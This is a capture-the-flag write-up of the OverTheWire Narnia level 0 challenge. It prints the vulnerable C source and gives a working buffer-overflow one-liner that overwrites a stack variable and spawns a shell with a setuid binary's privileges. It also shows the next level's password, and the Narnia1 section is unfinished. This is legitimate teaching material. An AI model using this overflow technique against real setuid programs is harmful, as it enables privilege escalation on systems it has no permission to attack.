## OverTheWire: Narnia
After the frusration and lack of success in the Oman Quals CTF, I've decided to redirect my attention to some of the OverTheWire challenges. I've already completed both the Bandit and Leviathon series of challenges, but will not be doing write-ups on those due to the amount of resources already out there.

### Narnia0
After logging in with the username and password `narnia0` and reading the Welcome banner. It is discovered that the passwords for each level are stored in /etc/narnia_pass/narniaX and the programs to be exploited are in /narnia/ (as well as the source code for said programs).

After looking at the code for narnia0.c, we can see that we need the val variable to be equal to 0xdeadbeef which can be done with a buffer overflow since the buf variable that is read-in from user input is just before the val variable on the stack. Also, because the executable narnia0 has the setuid bit set (s in the owner execute spot in a long listing) the shell that is run in the program will have the privileges of the owner, i.e. narnia1, and allow us to view that users password file.

```
int main(){
    long val=0x41414141;
    char buf[20];

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&buf);

    printf("buf: %s\n",buf);
    printf("val: 0x%08x\n",val);

    if(val==0xdeadbeef){
        setreuid(geteuid(),geteuid());
        system("/bin/sh");
    }
    else {
        printf("WAY OFF!!!!\n");
        exit(1);
    }

    return 0;
}
```

By entering `(python -c 'print "A"*20 + "\xef\xbe\xad\xde"*10')` and piping it into the file we don't get the "WAY OFF!!!!" that we normally would but we also don't get the shell that we expect. So we know it works (kind of) but why are we using those commands. Well '-c' is used to tell python that the following information will be command-line input. Then the 20 A's are used to take up the space in the buf variable and finally we have the 0xdeadbeef in reverse byte-order to account for how the bytes are stored in memory (most PCs are little-endian, i.e. the byte with the littlest value is stored first, this can be checked with the command `lscpu | grep "Byte Order"`).

Now we just have to add something to leave the input open after our code is run (after some research, I found the best way to do this was via the `cat` command).

So the full series of commands is as follows:
```
narnia0@narnia:~$ (python -c 'print "A"*20 + "\xef\xbe\xad\xde"'; cat) | /narnia/narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ▒
val: 0xdeadbeef
whoami
narnia1
```
And we can use this to find our flag:
```
cat /etc/narnia_pass/narnia1
efeidiedae
```

### Narnia1

**TBD** 
